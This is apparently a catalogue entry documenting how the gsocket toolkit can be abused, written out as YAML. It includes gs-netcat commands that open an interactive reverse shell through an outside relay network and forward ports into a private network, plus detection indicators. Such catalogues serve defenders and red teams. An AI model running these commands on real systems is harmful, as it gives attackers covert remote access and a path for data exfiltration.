---
Name: Gsocket
Description: The Global Socket Toolkit (gsocket) allows two hosts behind NAT/Firewall to establish an encrypted TCP connection with each other through the Global Socket Relay Network (GSRN), using tools like gs-netcat and gsocket. Can be abused for reverse shells, port forwarding, SOCKS proxying and data exfiltration.
Author: THC (The Hacker's Choice)
Created: 2026-08-17
Commands:
  - Command: gs-netcat -s MySecret -l -i
    Description: Server-side of a reverse PTY shell. Spawns a true interactive login shell when a client connects using the same secret.
    Usecase: Interactive reverse shell access to a host behind NAT/firewall.
    Category: Access
    Privileges: User
    OperatingSystem: Linux, MacOS, BSD, Windows (gs-netcat client)

  - Command: gs-netcat -s MySecret -i
    Description: Client-side connection to the gs-netcat listening server, giving a real interactive PTY shell.
    Usecase: Connecting to a reverse shell hosted behind NAT/firewall.
    Category: Access
    Privileges: User
    OperatingSystem: Linux, MacOS, BSD, Windows

  - Command: gs-netcat -s MySecret -l -d 192.168.6.7 -p 22
    Description: Port-forwards connections arriving on the client's specified port to 192.168.6.7:22 on the server's private network.
    Usecase: Reach an internal host/service on a NAT'd network.
    Category: Access
    Privileges: User
    OperatingSystem: Linux, MacOS, BSD, Windows
Full_Path:
  - Filename: gs-netcat
  - Filename: gsocket
Detection:
  - Domain: '*.gsocket.io'
  - Command: Execution of gs-netcat/gsocket binaries, including with -s <secret>, -l, -i or -e arguments.
Resources:
  - Link: https://www.gsocket.io/
  - Link: https://github.com/hackerschoice/gsocket
Acknowledgement:
  - Person: Jeffrey Tigchelaar-Moerbeek
---